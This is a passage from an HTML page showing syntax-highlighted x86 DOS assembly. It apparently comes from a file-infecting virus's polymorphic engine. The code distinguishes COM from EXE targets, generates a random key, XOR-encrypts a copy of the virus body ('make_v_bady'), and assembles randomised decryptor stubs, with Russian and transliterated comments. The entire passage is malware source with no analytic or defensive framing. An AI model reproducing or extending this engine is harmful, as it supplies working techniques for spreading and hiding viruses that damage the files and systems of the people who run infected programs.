         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc1">;----s7----------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc1">;-----s8-----------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc1">;----s9--------------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;-----s10--------------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;--doprog---------------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc1">;-----JE--------</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------</span><span class="sc0">

</span><span class="sc5">make_v_bady</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
                     </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
                     </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DO_STUFF</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">STUFF_SIZE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">136</span><span class="sc0">
</span><span class="sc5">@lll</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@lll</span><span class="sc0">
        </span><span class="sc1">;generet key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc1">; mov [w1],ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c1_key</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;------------------------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN_BADY</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zad</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">272</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0">
        </span><span class="sc1">;---------------------------------</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">272</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">stuff_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">typeFile</span><span class="sc4">],</span><span class="sc2">33h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@exe_</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eS</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;com</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@com</span><span class="sc0">
 </span><span class="sc5">@exe_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eS</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;exe</span><span class="sc0">
 </span><span class="sc5">@com</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;zashiphrovati</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">272</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">stuff_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c8_size</span><span class="sc4">+</span><span class="sc5">Z</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc5">c1_key</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;---------------------------------</span><span class="sc0">
</span><span class="sc1">; генерим декритор</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">204</span><span class="sc0"> </span><span class="sc1">;+R11-R16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">R</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count01</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c000</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c000</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">61</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">242</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c9</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; !@!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count01</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c001</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c001</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0"> </span><span class="sc1">; c001 otpr</span><span class="sc0">
        </span><span class="sc1">;Гатовим C1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">;R_c01</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count01</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c1_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0"> </span><span class="sc1">; c1 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">;R_c2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c01_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c01</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc0"> </span><span class="sc1">;c01 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">  </span><span class="sc1">;R_c3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c2_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c2 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c3_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c3 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c5</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c4 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c6</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">+</span><span class="sc2">73</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trans</span><span class="sc1">;c5 otpr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_count00</span><span class="sc1">;R_c7</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c6_c</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
